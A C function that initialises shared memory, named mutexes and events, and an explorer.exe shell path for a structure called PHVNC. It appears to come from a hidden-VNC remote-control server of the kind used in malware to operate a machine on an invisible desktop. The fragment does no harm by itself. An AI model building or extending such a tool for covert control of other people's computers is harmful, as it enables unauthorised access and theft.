bool InitGlobalData(PHVNC lpServer)
{
    bool ret_val=false;
    do
    {
        lpServer->hGlobalVNCMapping=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,sizeof(GLOBAL_VNC_DATA),lpServer->Names.szGlobalMappingName);
        lpServer->lpGlobalVNCData=(GLOBAL_VNC_DATA *)MapViewOfFile(lpServer->hGlobalVNCMapping,FILE_MAP_ALL_ACCESS,0,0,0);
        if ((!lpServer->lpGlobalVNCData) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->lpGlobalVNCData->dwVNCMessage=RegisterWindowMessageA(lpServer->DeskInfo.szDeskName);
        if (!lpServer->lpGlobalVNCData->dwVNCMessage)
            break;

        lpServer->EventsInfo.hInputMutex=CreateMutex(NULL,false,lpServer->Names.szInputMutex);
        if ((!lpServer->EventsInfo.hInputMutex) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hPaintMutex=CreateMutex(NULL,false,NULL);
        if (!lpServer->EventsInfo.hPaintMutex)
            break;

        lpServer->EventsInfo.hSharedMemMutex=CreateMutex(NULL,false,lpServer->Names.szSharedMemMutex);
        if ((!lpServer->EventsInfo.hSharedMemMutex) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hSendThreadMessageMutex=CreateMutex(NULL,false,lpServer->Names.szSendThreadMessageMutex);
        if ((!lpServer->EventsInfo.hSendThreadMessageMutex) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hSendThreadMessageEvent=CreateEvent(NULL,true,false,lpServer->Names.szSendThreadMessageEvent);
        if ((!lpServer->EventsInfo.hSendThreadMessageEvent) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hVNCKillEvent=CreateEvent(NULL,true,false,lpServer->Names.szVNCKillEventName);
        if ((!lpServer->EventsInfo.hVNCKillEvent) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hClipboardUpdatedEvent=CreateEvent(NULL,false,false,lpServer->Names.szClipboardUpdatedEvent);
        if ((!lpServer->EventsInfo.hClipboardUpdatedEvent) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        if ((GetWindowsDirectoryA(lpServer->Names.szShell,sizeof(lpServer->Names.szShell))) || (GetEnvironmentVariableA("windir",lpServer->Names.szShell,sizeof(lpServer->Names.szShell))))
            lstrcatA(lpServer->Names.szShell,"\\explorer.exe");
        else
            break;

        ret_val=true;
    }
    while (false);
    return ret_val;
}